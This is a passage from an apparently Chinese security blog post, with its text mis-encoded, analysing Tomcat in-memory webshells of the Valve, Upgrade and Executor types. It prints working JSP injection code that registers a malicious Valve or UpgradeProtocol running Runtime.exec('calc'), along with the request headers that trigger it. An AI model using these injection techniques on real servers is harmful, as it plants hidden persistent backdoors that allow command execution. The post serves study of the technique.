class="hljs-string">&quot;org.apache.catalina.Valve&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.è·å–standardContext</span><br>    <span class="hljs-comment">//è·å–ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-comment">//è·å–StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//è·å–Pipeline</span><br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>    <span class="hljs-comment">//æ·»åŠ æ¶æ„Valve</span><br>    pipeline.addValve(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Valve</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">//æ¶æ„ä»£ç </span><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½ç™½å±å¼¹è®¡ç®—å™¨</p><p><img src="https://cdn.clown2024.cn/202409211550418.png" alt="image-20240921155025355"></p><p><img src="https://cdn.clown2024.cn/202409211550385.png" alt="image-20240921155045287"></p><p>åœ¨è¿™ç¯‡æ–‡ç« çœ‹åˆ°ä¸€ä¸ªæ›´ç®€å•çš„è·å–standardContextçš„æ–¹æ³•ï¼š<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ›´ç®€å•çš„æ–¹æ³• è·å–StandardContext  </span><br> <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);  <br> reqF.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);  <br> <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext(); <br></code></pre></td></tr></table></figure><h1 id="tomcat-upgradeå†…å­˜é©¬"><a href="#Tomcat-Upgradeå†…å­˜é©¬" class="headerlink" title="Tomcat-Upgradeå†…å­˜é©¬"></a>Tomcat-Upgradeå†…å­˜é©¬</h1><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ-1" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>è¿™é‡Œå‚è€ƒæ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw">https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw</a></p><p>æ”¾ä¸€å¼ æ–‡ç« çš„è¿æ¥å™¨å›¾</p><p><img src="https://cdn.clown2024.cn/202409222103688.webp" alt="å›¾ç‰‡"></p><p>è¯¥å†…å­˜é©¬å°±æ˜¯åœ¨åˆ°è¾¾Containerä¹‹å‰çš„åˆ©ç”¨ï¼Œå› ä¸ºå¯èƒ½ä¼šç”±äºFilterçš„è¿‡æ»¤æˆ–è€…åä»£å¯¼è‡´æˆ‘ä»¬æ‰¾ä¸åˆ°è·¯å¾„ï¼Œå¯¼è‡´æˆ‘ä»¬çš„åˆ©ç”¨Containerå†…ç»„ä»¶çš„å†…å­˜é©¬æ— æ³•ä½¿ç”¨</p><p>é¦–å…ˆæŠ½è±¡ç±»<strong>AbstractProcessorLight</strong>çš„processæ–¹æ³•ä¸­ï¼Œä¼šæ ¹æ®å½“å‰<code>SocketWrapperBase</code>çš„çŠ¶æ€è¿›è¡Œå“åº”ï¼Œåœ¨<code>OPEN_READ</code>çŠ¶æ€æ—¶ï¼Œä¼šè°ƒç”¨å¯¹åº”çš„<code>Processor</code>çš„serviceæ–¹æ³•è¿›è¡Œå¤„ç†</p><p><img src="https://cdn.clown2024.cn/202409222122170.png" alt="image-20240922212210064"></p><p>è¿™é‡ŒHttpè¯·æ±‚è°ƒç”¨çš„å°±æ˜¯Http11Processor#serviceï¼Œç„¶åå®ƒé‡Œé¢æœ‰å¤„ç†Upgradeçš„é€»è¾‘</p><p><img src="https://cdn.clown2024.cn/202409222127551.png" alt="image-20240922212744457"></p><p>è¿™é‡Œçš„protocolæ˜¯Http11NioProtocolï¼Œçœ‹ä¸€ä¸‹ä»–çš„getUpgradeProtocolæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222129320.png" alt="image-20240922212924262"></p><p>è¿™é‡Œèµ°åˆ°çš„æ˜¯çˆ¶ç±»çš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å°±æ˜¯è¿”å›ä¸€ä¸ªUpgradeProtocolï¼ŒhttUpgradeProtocolsæ˜¯ä¸€ä¸ªhashMapï¼›è·å–äº†upgradeProtocolä¹‹åï¼Œå®ƒä¸‹é¢è¿˜è°ƒç”¨äº†ä»–çš„acceptæ–¹æ³•</p><p>æ¬¸é‚£è¿™é‡Œå†…å­˜é©¬çš„æ€è·¯å°±å‡ºæ¥äº†ï¼Œå’Œä¹‹å‰çš„ä¹Ÿå¾ˆç±»ä¼¼</p><p>é¦–å…ˆè¿™ä¸ªUpgradeProtocolæ˜¯ä¸€ä¸ªæ¥å£</p><p><img src="https://cdn.clown2024.cn/202409222140816.png" alt="image-20240922214008767"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦æ„é€ ä¸€ä¸ªæ¶æ„çš„UpgradeProtocolçš„å®ç°ç±»ï¼Œæ·»åŠ è¿›æˆ‘ä»¬å‰é¢çš„æåˆ°çš„httpUpgradeProtocolsé‡Œé¢å³å¯</p><p>é‚£ä¹ˆç°åœ¨å°±æ˜¯è¦æ‰¾è¿™ä¸ªhttpUpgradeProtocolsæ€ä¹ˆè·å–ï¼Œè¿™é‡Œå…ˆè·Ÿæ–‡ç« çœ‹çœ‹httpUpgradeProtocolsæ˜¯å“ªé‡Œè¢«èµ‹å€¼çš„</p><p><img src="https://cdn.clown2024.cn/202409222144324.png" alt="image-20240922214420260"></p><p>åœ¨AbstractHttp11Protocol#initæ–¹æ³•é‡Œé¢å¯¹upgradeProtocolsè¿›è¡Œäº†éå†ï¼Œç„¶åè°ƒç”¨äº†configureUpgradeProtocolæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222146364.png" alt="image-20240922214605304"></p><p>ç„¶åè¯¥æ–¹æ³•upgradeProtocolæ·»åŠ åˆ°hashMapä¸­</p><blockquote><p>upgradeProtocolsæ˜¯åœ¨tomcatå¯åŠ¨çš„æ—¶å€™è¿›è¡Œåˆå§‹åŒ–</p></blockquote><h2 id="å†…å­˜é©¬ç¼–å†™"><a href="#å†…å­˜é©¬ç¼–å†™-1" class="headerlink" title="å†…å­˜é©¬ç¼–å†™"></a>å†…å­˜é©¬ç¼–å†™</h2><p>ç¬¬ä¸€æ­¥å…ˆæ‰¾åˆ°Http11NioProtocolï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<strong>request.request.connector.protocolHandler</strong>ä¸­æ‰¾åˆ°</p><p><img src="https://cdn.clown2024.cn/202409222151834.png" alt="image-20240922215129782"></p><p><img src="https://cdn.clown2024.cn/202409222151796.png" alt="image-20240922215134740"></p><p>ç„¶åhttpUpgradeProtocolså±æ€§å°±åœ¨é‡Œé¢ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åå°„å»è·å–ï¼Œæˆ‘çœ‹äº†ä¸€ä¸‹æ²¡æœ‰ç›´æ¥getçš„æ–¹æ³•</p><p>ç¬¬äºŒæ­¥å°±æ˜¯ç¼–å†™æ¶æ„çš„UpgradeProtocoläº†</p><p><strong>exp</strong></p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Connector&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.UpgradeProtocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.HashMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Processor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Adapter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.åå°„è·å–httpUpgradeProtocols</span><br>    <span class="hljs-type">RequestFacade</span> <span class="hljs-variable">rf</span> <span class="hljs-operator">=</span> (RequestFacade) request;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> RequestFacade.class.getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    requestField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">request1</span> <span class="hljs-operator">=</span> (Request) requestField.get(rf);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> Request.class.getDeclaredField(<span class="hljs-string">&quot;connector&quot;</span>);<br>    connector.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Connector</span> <span class="hljs-variable">realConnector</span> <span class="hljs-operator">=</span> (Connector) connector.get(request1);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">protocolHandlerField</span> <span class="hljs-operator">=</span> Connector.class.getDeclaredField(<span class="hljs-string">&quot;protocolHandler&quot;</span>);<br>    protocolHandlerField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">AbstractHttp11Protocol</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);<br><br>    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">upgradeProtocolsField</span> <span class="hljs-operator">=</span> AbstractHttp11Protocol.class.getDeclaredField(<span class="hljs-string">&quot;httpUpgradeProtocols&quot;</span>);<br>    upgradeProtocolsField.setAccessible(<span class="hljs-literal">true</span>);<br>    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);<br>    <span class="hljs-comment">//2.æ„é€ æ¶æ„çš„UpgradeProtocol</span><br>    <span class="hljs-type">UpgradeProtocol</span> <span class="hljs-variable">upgradeProtocol</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpgradeProtocol</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getHttpUpgradeName</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isSSLEnabled)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getAlpnIdentifier() &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAlpnName</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Processor <span class="hljs-title function_">getProcessor</span><span class="hljs-params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> InternalHttpUpgradeHandler <span class="hljs-title function_">getInternalUpgradeHandler</span><span class="hljs-params">(Adapter adapter, org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(org.apache.coyote.Request request)</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//3.æ·»åŠ è¿›upgradeProtocols</span><br>    upgradeProtocols.put(<span class="hljs-string">&quot;clown&quot;</span>,upgradeProtocol);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®çš„æ—¶å€™å¸¦ä¸Šupgrade</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Upgrade: clown<br>Connection: Upgrade<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409222209433.png" alt="image-20240922220915371"></p><p><img src="https://cdn.clown2024.cn/202409222210497.png" alt="image-20240922221016377"></p><p>æˆåŠŸå¼¹è®¡ç®—å™¨</p><h1 id="tomcat-executorå†…å­˜é©¬"><a href="#Tomcat-Executorå†…å­˜é©¬" class="headerlink" title="Tomcat-Executorå†…å­˜é©¬"></a>Tomcat-Executorå†…å­˜é©¬</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ">https://mp.weixin.qq.com/s/cU2s8D2BcJHTc7IuXO-1UQ</a></p><h2 id="æ‰§è¡Œæµç¨‹åˆ†æ"><a href="#æ‰§è¡Œæµç¨‹åˆ†æ" class="headerlink" title="æ‰§è¡Œæµç¨‹åˆ†æ"></a>æ‰§è¡Œæµç¨‹åˆ†æ</h2><p>è¿™é‡Œä¸´æ—¶æ’å…¥é‡æ–°åˆ†æä¸€ä¸‹Connectorçš„æµç¨‹ï¼Œå› ä¸ºæœ‰ç‚¹ä¹±ï¼Œå¯¼è‡´æˆ‘åé¢çœ‹Executorå†…å­˜é©¬ä¼šæœ‰ç‚¹æ··ä¹±</p><p><strong>æœåŠ¡çš„å¯åŠ¨æ—¶</strong></p><p>è¿™é‡Œå°±è¯´ä¸€ä¸‹å„ä¸ªç±»çš„åˆå§‹åŒ–çš„é¡ºåºï¼Œä»StandardServiceçš„åˆå§‹åŒ–æ–¹æ³•å¼€å§‹</p><p><img src="https://cdn.clown2024.cn/202409262315547.png" alt="image-20240926231523449"></p><blockquote><p>å›¾åªæ˜¯å‚è€ƒï¼Œå…·ä½“æ–¹æ³•ä¸ä¸€å®šå¯¹ï¼Œå› ä¸ºæ˜¯åˆ«äººç”»çš„å›¾ï¼Œå¯èƒ½tomcatç‰ˆæœ¬ä¸ä¸€æ ·æ–¹æ³•åä¼šæœ‰å·®å¼‚ï¼Œè¿™é‡ŒæŒ‰ç…§çš„æ˜¯æˆ‘è‡ªå·±çš„ç‰ˆæœ¬åˆ†æ</p></blockquote><p>StandardService#initInternal</p><p><img src="https://cdn.clown2024.cn/202409262320249.png" alt="image-20240926232011146"></p><p>è¿™é‡Œæ‰§è¡Œäº†å›¾ä¸­çš„ä¸‰ä¸ªinitæ–¹æ³•ï¼Œé‡ç‚¹çœ‹initæ–¹æ³•ï¼Œè¿™é‡Œæœ‰executor.init()æ–¹æ³•ï¼Œä½†æ˜¯æ­¤æ—¶executorsæ•°ç»„ä¸ºç©ºæ‰€ä»¥æ²¡æœ‰æ‰§è¡Œï¼Œåº”è¯¥æ˜¯åœ¨åé¢æœ‰è¯·æ±‚çš„æ—¶å€™æ”¾å…¥</p><p>è¿™ä¸ªconnectoræ˜¯Connectorç±»ï¼Œç„¶åinitå»åˆ°äº†çˆ¶ç±»LifecycleBaseçš„initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262327581.png" alt="image-20240926232630314"></p><p>ç„¶åå†è°ƒç”¨initInternalæ–¹æ³•å›åˆ°Connector</p><p><img src="https://cdn.clown2024.cn/202409262328153.png" alt="image-20240926232843081"></p><p>ç„¶åè°ƒç”¨Http11NioProtocol#setAdapterè®¾ç½®ä¸€ä¸ªadapter</p><p>ç„¶åå¾€ä¸‹è°ƒç”¨äº†protocolHandler#init()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262329171.png" alt="image-20240926232959094"></p><p>ç„¶ååˆèµ°åˆ°çˆ¶ç±»AbstractHttp11Protocolçš„initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262331554.png" alt="image-20240926233137474"></p><p>ç„¶ååˆæ‰ç”¨çˆ¶ç±»çš„AbstractProtocolçš„initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262332748.png" alt="image-20240926233241664"></p><p>é‡Œé¢åˆè°ƒç”¨NioEndpointçš„initæ–¹æ³•</p><p>ç„¶ååˆæ˜¯èµ°åˆ°çˆ¶ç±»AbstractJsseEndpointçš„initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262334655.png" alt="image-20240926233401589"></p><p>ç„¶ååˆè°ƒç”¨çˆ¶ç±»çš„AbstractEndpointçš„initæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409262335562.png" alt="image-20240926233521470"></p><p>è¿™é‡Œçš„bindæ–¹æ³•å°±æ˜¯è°ƒç”¨NioEndpointçš„bindæ–¹æ³•æ¥èµ·ä¸€ä¸ªsocketæœåŠ¡ç›‘å¬ç«¯å£äº†</p><p><img src="https://cdn.clown2024.cn/202409262336888.png" alt="image-20240926233650811"></p><p>é»˜è®¤çš„acceptCountæ˜¯100ï¼Œç„¶åè¿™å°±æ˜¯å¤§æ¦‚çš„æµç¨‹</p><p>é¡ºä¾¿æä¸€ä¸‹ï¼Œä¸€å¼€å§‹çš„connectoræ˜¯æœ‰ä¸¤ä¸ªçš„ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202409262352133.png" alt="image-20240926235226049"></p><p><strong>æ¥å—è¯·æ±‚åçš„åˆ†æ</strong></p><p>è¿™é‡Œå°±åˆ†æåˆ°Executorçš„ä½ç½®ï¼Œå› ä¸ºè¿™æ˜¯ä¸´æ—¶æ’å…¥çš„ä¸‹é¢å·²ç»å†™å¥½äº†æ‡’å¾—åŠ¨äº†ğŸ˜¢</p><p>å‰é¢æ–‡ç« è¯´åˆ°ï¼Œæ¥å—äº†è¯·æ±‚ä¹‹åä¼šä¼ é€’ç»™setSocketOptionsæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409270008999.png" alt="image-20240927000803914"></p><p>ç„¶åè¿™é‡Œè·å–äº†Polleræ³¨å†Œäº†channel</p><p><img src="https://cdn.clown2024.cn/202409270009941.png" alt="image-20240927000918856"></p><p>ç„¶åè¿™ä¸ªPollerä¹Ÿæ˜¯å®ç°äº†Runnableæ¥å£çš„ï¼Œé‚£åé¢å°±ä¼šèµ°åˆ°ä»–çš„runæ–¹æ³•é‡Œé¢ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409270011717.png" alt="image-20240927001157616"></p><p>ç„¶åprocessKeyé‡Œé¢åˆä¼šèµ°åˆ°ä¸€ä¸ªprocessSocketæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409270012045.png" alt="image-20240927001244969"></p><p>ç„¶åå°±ä¼šèµ°åˆ°æˆ‘ä»¬è¦é‡ç‚¹å…³æ³¨çš„<strong>executor.execute</strong>æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409270013273.png" alt="image-20240927001342167"></p><blockquote><p>å¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œä½†æ˜¯è°ƒè¯•çš„æ—¶å€™æœ‰æ—¶å€™æµç¨‹è¿˜æ˜¯ä¼šå˜å¾—å¾ˆæ€ªï¼Œå°¤å…¶æ˜¯ä¸­é—´è·³åˆ°Executoré‚£ä¸€å—ï¼Œè°ƒçš„å¹¶ä¸æ˜¯å¾ˆæ˜ç™½</p></blockquote><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ-2" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/11593?time__1311=n4+hiIqGx0xfxCw4mqGNapDNDkIetK4GOexAoTD&u_atoken=0088f6c6149c7ae10aab8ab2e8ed1bd8&u_asig=0a472f9217270143300633216e003d">Executorå†…å­˜é©¬çš„å®ç° - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>è¿™é‡Œåˆå¼•ç”¨æ–‡ç« ä¸­connectorçš„ç»“æ„å›¾ï¼š</p><p><img src="https://cdn.clown2024.cn/202409230948596.png" alt="image-20240923094855433"></p><p>connectorå°±åˆ†ä¸ºProtocolHandlerå’ŒAdapterï¼ŒProtocolHandlerå°±ç”¨æ¥å¤„ç†è¯·æ±‚ï¼ŒAdapterå°±æ˜¯connectorå’Œcontainerçš„æ¡¥æ¢ï¼Œç”¨äºå°†å¤„ç†åçš„è¯·æ±‚ä¼ é€’ç»™container</p><p>æœ‰å…³äºProtocolHandlerçš„åˆ†ç±»åœ¨å‰é¢çš„å†…å­˜é©¬ä¹Ÿäº†è§£äº†ä¸€ç‚¹ï¼Œæ–‡ç« ä¸­åˆåšäº†ä¸€ä¸ªå¯¼å›¾æ¥åˆ†ç±»æ›´åŠ æ¸…æ™°ï¼Œä¹Ÿæ”¾ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409230957003.png" alt="image-20240923095712898"></p><p>è¿™é‡Œå…³æ³¨Http11NioProtocolçš„å®ç°</p><p>Endpointæ˜¯ProtocolHandlerçš„ç»„æˆä¹‹ä¸€ï¼Œè€ŒNioEndpointæ˜¯Http11NioProtoclä¸­çš„å®ç°ã€‚<br>Endpointäº”å¤§ç»„ä»¶ï¼š</p><ul><li>LimitLatchï¼šè¿æ¥æ§åˆ¶å™¨ï¼Œè´Ÿè´£æ§åˆ¶æœ€å¤§çš„è¿æ¥æ•°</li><li>Acceptorï¼šè´Ÿè´£æ¥æ”¶æ–°çš„è¿æ¥ï¼Œç„¶åè¿”å›ä¸€ä¸ªChannelå¯¹è±¡ç»™Poller</li><li>Pollerï¼šå¯ä»¥å°†å…¶çœ‹æˆæ˜¯NIOä¸­Selectorï¼Œè´Ÿè´£ç›‘æ§Channelçš„çŠ¶æ€</li><li>SocketProcessorï¼šå¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªè¢«å°è£…çš„ä»»åŠ¡ç±»</li><li>Executorï¼šTomcatè‡ªå·±æ‰©å±•çš„çº¿ç¨‹æ± ï¼Œç”¨æ¥æ‰§è¡Œä»»åŠ¡ç±»</li></ul><p>é‡ç‚¹çœ‹Executorçš„è¿‡ç¨‹</p><p><img src="https://cdn.clown2024.cn/202409242331554.png" alt="image-20240924233136428"></p><p>æˆ‘ä»¬è¿™é‡Œåœ¨AbstractEndPoint#processSocketæ–¹æ³•å¤„æ‰“æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°ä»–è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªExecutorï¼Œç„¶åä¸‹ä¸€æ­¥executeäº†ä¸€ä¸ªçº¿ç¨‹ä»»åŠ¡</p><blockquote><p>åœ¨Tomcatä¸­Executorç”±Serviceç»´æŠ¤ï¼Œå› æ­¤åŒä¸€ä¸ªServiceä¸­çš„ç»„ä»¶å¯ä»¥å…±äº«ä¸€ä¸ªçº¿ç¨‹æ± ã€‚å¦‚æœæ²¡æœ‰å®šä¹‰ä»»ä½•çº¿ç¨‹æ± ï¼Œç›¸å…³ç»„ä»¶( å¦‚Endpoint)ä¼šè‡ªåŠ¨åˆ›å»ºçº¿ç¨‹æ± ï¼Œæ­¤æ—¶ï¼Œçº¿ç¨‹æ± ä¸å†å…±äº«ã€‚</p></blockquote><p>è·Ÿè¿›å»executeæ–¹æ³•çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202409242335057.png" alt="image-20240924233503993"></p><p><img src="https://cdn.clown2024.cn/202409242335760.png" alt="image-20240924233534681"></p><p>æ‰€ä»¥çŸ¥é“é€»è¾‘åå’Œå‰é¢ä¸€æ ·ï¼Œç»§æ‰¿å¯¹åº”çš„ç±»ç„¶åå°†æ¶æ„ä»£ç é‡å†™è¿›æ–¹æ³•é‡Œé¢</p><p>è¿™é‡Œçš„Executorç±»æ˜¯ThreadPoolExecutorç±»</p><p><img src="https://cdn.clown2024.cn/202409271641484.png" alt="image-20240927164111381"></p><p>è¯¥ç±»ç»§æ‰¿çš„æºå¤´å°±æ˜¯Executoræ¥å£</p><p><img src="https://cdn.clown2024.cn/202409271644613.png" alt="image-20240927164456561"></p><p>æ–‡ç« 